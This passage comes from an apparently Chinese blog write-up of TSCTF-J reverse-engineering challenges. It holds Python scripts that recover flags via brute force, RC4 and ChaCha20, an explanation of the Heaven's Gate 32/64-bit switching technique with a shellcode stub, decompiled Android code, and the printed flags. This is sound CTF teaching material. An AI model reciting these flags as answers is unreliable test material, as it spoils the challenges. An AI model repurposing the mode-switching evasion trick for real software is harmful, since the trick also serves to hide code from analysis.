class="number">1633</span>, <span class="number">807</span>, <span class="number">1645</span>,</span><br><span class="line">    <span class="number">941</span>, <span class="number">1673</span>, <span class="number">971</span>, <span class="number">1863</span>, <span class="number">941</span>, <span class="number">1648</span>, <span class="number">789</span>, <span class="number">1620</span>, <span class="number">941</span>, <span class="number">1659</span>,</span><br><span class="line">    <span class="number">1255</span>, <span class="number">2157</span>, <span class="number">1167</span>, <span class="number">2121</span>, <span class="number">941</span>, <span class="number">1647</span>, <span class="number">807</span>, <span class="number">1662</span>, <span class="number">845</span>, <span class="number">1634</span>,</span><br><span class="line">    <span class="number">1243</span>, <span class="number">2165</span>, <span class="number">813</span>, <span class="number">1650</span>, <span class="number">941</span>, <span class="number">1676</span>, <span class="number">813</span>, <span class="number">1697</span>, <span class="number">783</span>, <span class="number">1589</span>,</span><br><span class="line">    <span class="number">941</span>, <span class="number">1654</span>, <span class="number">1167</span>, <span class="number">2097</span>, <span class="number">1255</span>, <span class="number">2157</span>, <span class="number">941</span>, <span class="number">1673</span>, <span class="number">789</span>, <span class="number">1597</span>,</span><br><span class="line">    <span class="number">941</span>, <span class="number">1655</span>, <span class="number">941</span>, <span class="number">1653</span>, <span class="number">813</span>, <span class="number">1673</span>, <span class="number">789</span>, <span class="number">1598</span>, <span class="number">891</span>, <span class="number">1735</span>,</span><br><span class="line">    <span class="number">941</span>, <span class="number">1600</span>, <span class="number">629</span>, <span class="number">1076</span>, <span class="number">891</span>, <span class="number">1728</span>, <span class="number">603</span>, <span class="number">1008</span>, <span class="number">389</span>, <span class="number">827</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag_bytes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>, <span class="number">2</span>):</span><br><span class="line">    newA, newB = array3[i], array3[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        num2 = ((a &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFF</span>) ^ <span class="number">83</span></span><br><span class="line">        newA_calc = ((num2 + a) ^ (a + <span class="number">72</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">if</span> newA_calc != newA:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        val = (newB - newA) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        b = num2 ^ val</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= b &lt; <span class="number">256</span>:</span><br><span class="line">            flag_bytes.extend([a, b])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(flag_bytes).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>TSCTF-J{3f619a0b_Would_you_say_that_someone_who_had_every_intention_to_be_brave_was_a_coward?_81dd64f3}</p><h3 id="天堂之门"><a href="#天堂之门" class="headerlink" title="天堂之门"></a>天堂之门</h3><p>可以直接看，之前做DubheCTF的时候做到过类似的题，这题算是弱化版吧</p><p><a href="https://clovershrub.github.io/2024/03/19/DubheCTF-Destination&Moon/index.html">DubheCTF-Destination&amp;Moon | Clovershrub</a></p><p>这个Dubhe和SUS都出过类似的题刚好做过</p><p>也可以看我的<a href="https://matriy330.github.io/de9c80c5/?highlight=%E5%A4%A9%E5%A0%82">DubheCTF 2024 re 复现 | Matriy’s blog</a></p><p>天堂之门技术简述：</p><blockquote><p>在<strong>x64</strong>下的进程，不管是32位或者是64位，实际上都映射了两个地址空间，一个是32位，一个是64位，相当于一个进程的两种工作模式。</p><p>解释：在64位的操作系统上，32位的应用程序并不能直接在64位环境下运行。为了使32位程序可以正常运行，操作系统提供了一个称为<strong>WoW64</strong>（Windows on Windows 64-bit）的子系统。WoW64 子系统相当于一个兼容层，专门为32位程序提供了类似32位的运行环境。</p><p>他们之间的关键区别在于<code>cs</code>段寄存器。</p><p>64位:CS &#x3D; 0x33 32位:CS &#x3D; 0x23</p><p>Windows判别位的方式，是根据<code>cs</code>段寄存器的，所以只要修改<code>cs</code>的值，就能实现切换，再使用<code>retf</code>指令回到xx位。</p></blockquote><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013132901694.png" alt="image-20251013132901694"></p><p>0x401720 的 main 中，通过 get_image_base() 拿到模块基址，接着在 0x40180C 初始化 rc4_state，for循环里执行 memcpy(&amp;rc4_state[64 * i], Src, 0x40u)，做 4 次。因为 Src 就是 PE 镜像开头（DOS 头），每次拷贝 0x40 字节，四次拼起来正好 256 字节，这就是 RC4 状态数组的来源。</p><p>get_image_base里的三次 memcpy 把 NtCurrentPeb()-&gt;Ldr 结构一路走链表：先取 PEB-&gt;Ldr，再取 Ldr-&gt;InMemoryOrderModuleList.Flink。这是标准的 PEB 遍历流程，返回的就是当前模块的装载基址，也就是 DOS&#x2F;PE 头所在的地址。</p><blockquote><p>做的时候没有调试，上面这个猜也能猜到，虽然我是静态出的</p></blockquote><p>如果调试也行：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013143506165.png" alt="image-20251013143506165"></p><p>此时 EAX 就是 Src 的值，也就是当前模块的装载基址。右键 EAX → Follow in Dump，Dump 窗口会直接显示该地址的内存内容；可以看到开头是 4D 5A … 的 DOS 头</p><p>main读取 40 字符输入，复制 PE 头首 0x40 字节 4 次到 256 字节状态，调用 rc4_transform 做 RC4 变换，再把结果与 0x405000 处的10 个 dword 比较</p><p>这里我提供两种分析方式</p><p><strong>静态分析</strong>：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013163703598.png" alt="image-20251013163703598"></p><p>这段所有的提取出来</p><p>有几种方式发现逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stub_bytes = [</span><br><span class="line">    0x6A, 0x33, 0x68, 0x78, 0x56, 0x34, 0x12, 0xCB, 0x56, 0x57, 0x48, 0xBE,</span><br><span class="line">    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBF, 0x00, 0x00,</span><br><span class="line">    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">    0x00, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC0, 0x45, 0x33, 0xC9, 0x41, 0xFE,</span><br><span class="line">    0xC0, 0x42, 0x0F, 0xB6, 0x04, 0x07, 0x41, 0x00, 0xC1, 0x42, 0x8A, 0x14,</span><br><span class="line">    0x0F, 0x42, 0x88, 0x14, 0x07, 0x42, 0x88, 0x04, 0x0F, 0x42, 0x0F, 0xB6,</span><br><span class="line">    0x04, 0x07, 0x42, 0x02, 0x04, 0x0F, 0x40, 0x0F, 0xB6, 0x04, 0x07, 0x30,</span><br><span class="line">    0x06, 0x48, 0xFF, 0xC6, 0xE2, 0xD4, 0x5F, 0x5E, 0x6A, 0x23, 0x68, 0x78,</span><br><span class="line">    0x56, 0x34, 0x12, 0x48, 0xCB, 0xC3</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ol><li><p>丢给chatgpt</p></li><li><p><a href="https://defuse.ca/online-x86-assembler.htm#disassembly2">Online x86 and x64 Intel Instruction Assembler</a></p><p>手搓</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013164527419.png" alt="image-20251013164527419"></p></li><li><p>patch到一个新文件</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013164612347.png" alt="image-20251013164612347"></p></li><li><p>patch到IDA打开的文件的某个可用地址</p><p><img src="C:\Users\soul\AppData\Roaming\Typora\typora-user-images\image-20251013165126021.png" alt="image-20251013165126021"></p></li></ol><p>动态分析</p><p>动调然后对</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013165208241.png" alt="image-20251013165208241"></p><p>下断点分析</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011154341441.png" alt="image-20251011154341441"></p><p>heavens_gate_thread 与 wow64_gate_probe transition 只是维持门</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_keystream</span>(<span class="params">state: <span class="built_in">bytearray</span>, length: <span class="built_in">int</span></span>):</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + state[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        state[i], state[j] = state[j], state[i]</span><br><span class="line">        <span class="keyword">yield</span> state[(state[i] + state[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    pe = Path(<span class="string">&quot;heaven.exe&quot;</span>).read_bytes()</span><br><span class="line">    state = <span class="built_in">bytearray</span>(pe[:<span class="number">0x40</span>] * <span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span>(state)</span><br><span class="line"></span><br><span class="line">    cipher = <span class="built_in">bytes</span>([</span><br><span class="line">        <span class="number">0x0E</span>, <span class="number">0xEB</span>, <span class="number">0xFB</span>, <span class="number">0xC4</span>, <span class="number">0xD6</span>, <span class="number">0x60</span>, <span class="number">0x07</span>, <span class="number">0x7B</span>, <span class="number">0x57</span>, <span class="number">0x25</span>,</span><br><span class="line">        <span class="number">0x79</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>, <span class="number">0x34</span>, <span class="number">0x12</span>, <span class="number">0x57</span>, <span class="number">0x30</span>, <span class="number">0x23</span>, <span class="number">0x29</span>, <span class="number">0x7E</span>,</span><br><span class="line">        <span class="number">0x3F</span>, <span class="number">0x2B</span>, <span class="number">0x38</span>, <span class="number">0x7C</span>, <span class="number">0x12</span>, <span class="number">0x2A</span>, <span class="number">0x79</span>, <span class="number">0x39</span>, <span class="number">0x08</span>, <span class="number">0x12</span>,</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x75</span>, <span class="number">0x7F</span>, <span class="number">0x7B</span>, <span class="number">0x7E</span>, <span class="number">0x2B</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x2C</span>, <span class="number">0x30</span>,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    flag_bytes = <span class="built_in">bytes</span>(c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(cipher, rc4_keystream(state, <span class="built_in">len</span>(cipher))))</span><br><span class="line">    <span class="built_in">print</span>(flag_bytes.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>TSCTF-J{Wh4t_4_W0nd3rfu1_g4tE_$8263fbea}</p><h3 id="GrilHook"><a href="#GrilHook" class="headerlink" title="GrilHook"></a>GrilHook</h3><blockquote><p>我是静态出的，但是出题人可能希望考察hook，或者加了反调，识别特征啥的，后面有时间再补</p><p>支持一下插件：<a href="https://github.com/Lynnette177/GirlHook"><a href="https://github.com/Lynnette177/GirlHook">Lynnette177&#x2F;GirlHook: GirlHook is a Lua-scriptable ART hook framework designed for dynamic method interception and gadget-level instrumentation on Android. G.I.R.L. stands for Gadget-Injection Runtime for Lua, highlighting its modular native core and script-driven flexibility. GirlHook是一个轻量化的运行LUA脚本的Android Hook框架</a></a></p><p>点点star 0.0</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lynnette.girlhook;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> kotlin.text.Typography;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;girlhook&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        <span class="keyword">if</span> (getSupportActionBar() != <span class="literal">null</span>) &#123;</span><br><span class="line">            getSupportActionBar().hide();</span><br><span class="line">        &#125;</span><br><span class="line">        setContentView(C0860R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">check_if_correct</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] cArr = &#123;<span class="number">171</span>, <span class="number">205</span>&#125;;</span><br><span class="line">        <span class="comment">//  [255, 158, 232, 153, 237, 224, 225, 182, 195, 162, 220, 146, 223, 162, 244, 165, 196, 162, 192, 146, 194, 163, 244, 140, 249, 153, 148, 176]</span></span><br><span class="line">        <span class="type">char</span>[] cArr2 = &#123;<span class="number">255</span>, <span class="number">158</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">237</span>, <span class="number">224</span>, <span class="number">225</span>, Typography.paragraph, <span class="number">195</span>, Typography.cent, <span class="number">220</span>, <span class="number">146</span>, <span class="number">223</span>, Typography.cent, <span class="number">244</span>, <span class="number">165</span>, <span class="number">196</span>, Typography.cent, <span class="number">192</span>, <span class="number">146</span>, <span class="number">194</span>, Typography.pound, <span class="number">244</span>, <span class="number">140</span>, <span class="number">249</span>, <span class="number">153</span>, <span class="number">148</span>, Typography.degree&#125;;</span><br><span class="line">        <span class="keyword">if</span> (str.length() != <span class="number">28</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((<span class="type">char</span>) (str.charAt(i) ^ cArr[i % <span class="number">2</span>])) != cArr2[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check_again</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> str.equals(<span class="string">&quot;AmQTDHd7fy5CIAQyRUokVD1RJ3VlJFM4WTE+CBcn&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onVerifyClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> ((EditText) findViewById(C0860R.C0863id.input_text)).getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (!check_if_correct(obj) ? check_again(obj) : <span class="literal">true</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;正确!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;错误&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是jadx打开后，非常简单，题目是hook这个肯定不对，直接看so层</p><p>打开就能看到waht_is,一看就非常眼熟,chacha20</p><blockquote><p>怎么看出来的?可以看我的<a href="https://matriy330.github.io/32958ffb/">CTF逆向常见加密算法总结 | Matriy’s blog</a>函数开头把四个字常量依次写进状态数组：0x61707865、0x3320646E、0x79622D32、0x6B206574</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013170901380.png" alt="image-20251013170901380"></p></blockquote><p>initial_global里调用了这个方法，去动态的hook修改方法功能</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011155602338.png" alt="image-20251011155602338"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011155708244.png" alt="image-20251011155708244"></p><p>本来想hook的，看到chacha20感觉不太复杂看看能不能直接出</p><p>找到secret</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011155956801.png" alt="image-20251011155956801"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">SO_PATH = Path(<span class="string">&quot;libgirlhook.so&quot;</span>)</span><br><span class="line">SECRET_FILE_OFFSET = <span class="number">0x18CC40</span></span><br><span class="line">SECRET_SIZE = <span class="number">1436</span></span><br><span class="line">KEY = <span class="string">b&quot;youareclosetoit_youareclosetoit_&quot;</span></span><br><span class="line">NONCE = <span class="string">b&quot;continueabcd&quot;</span></span><br><span class="line">INITIAL_COUNTER = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl32</span>(<span class="params">value: <span class="built_in">int</span>, shift: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    value &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; shift) &amp; <span class="number">0xFFFFFFFF</span>) | (value &gt;&gt; (<span class="number">32</span> - shift))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quarter_round</span>(<span class="params">state, a, b, c, d</span>):</span><br><span class="line">    state[a] = (state[a] + state[b]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    state[d] ^= state[a]</span><br><span class="line">    state[d] = rotl32(state[d], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    state[c] = (state[c] + state[d]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    state[b] ^= state[c]</span><br><span class="line">    state[b] = rotl32(state[b], <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">    state[a] = (state[a] + state[b]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    state[d] ^= state[a]</span><br><span class="line">    state[d] = rotl32(state[d], <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    state[c] = (state[c] + state[d]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    state[b] ^= state[c]</span><br><span class="line">    state[b] = rotl32(state[b], <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chacha20_block</span>(<span class="params">key_words, counter, nonce_words</span>):</span><br><span class="line">    state = [</span><br><span class="line">        <span class="number">0x61707865</span>, <span class="number">0x3320646E</span>, <span class="number">0x79622D32</span>, <span class="number">0x6B206574</span>,</span><br><span class="line">        *key_words,</span><br><span class="line">        counter,</span><br><span class="line">        *nonce_words</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    working = state.copy()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        quarter_round(working, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>)</span><br><span class="line">        quarter_round(working, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>)</span><br><span class="line">        quarter_round(working, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>)</span><br><span class="line">        quarter_round(working, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        quarter_round(working, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">        quarter_round(working, <span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>)</span><br><span class="line">        quarter_round(working, <span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>)</span><br><span class="line">        quarter_round(working, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(</span><br><span class="line">        struct.pack(<span class="string">&quot;&lt;I&quot;</span>, (working[i] + state[i]) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chacha20_decrypt</span>(<span class="params">ciphertext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, nonce: <span class="built_in">bytes</span>, counter: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    key_words = struct.unpack(<span class="string">&quot;&lt;8I&quot;</span>, key)</span><br><span class="line">    nonce_words = struct.unpack(<span class="string">&quot;&lt;3I&quot;</span>, nonce)</span><br><span class="line"></span><br><span class="line">    plaintext = <span class="built_in">bytearray</span>()</span><br><span class="line">    block_counter = counter</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">64</span>):</span><br><span class="line">        keystream_block = chacha20_block(key_words, block_counter, nonce_words)</span><br><span class="line">        block_counter = (block_counter + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        chunk = ciphertext[offset:offset + <span class="number">64</span>]</span><br><span class="line">        plaintext.extend(c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(chunk, keystream_block))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    so_bytes = SO_PATH.read_bytes()</span><br><span class="line">    secret = so_bytes[SECRET_FILE_OFFSET:SECRET_FILE_OFFSET + SECRET_SIZE]</span><br><span class="line"></span><br><span class="line">    lua_plain = chacha20_decrypt(secret, KEY, NONCE, INITIAL_COUNTER)</span><br><span class="line">    Path(<span class="string">&quot;decrypted_lua.lua&quot;</span>).write_bytes(lua_plain)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;完成：decrypted_lua.lua (<span class="subst">&#123;<span class="built_in">len</span>(lua_plain)&#125;</span> 字节)&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 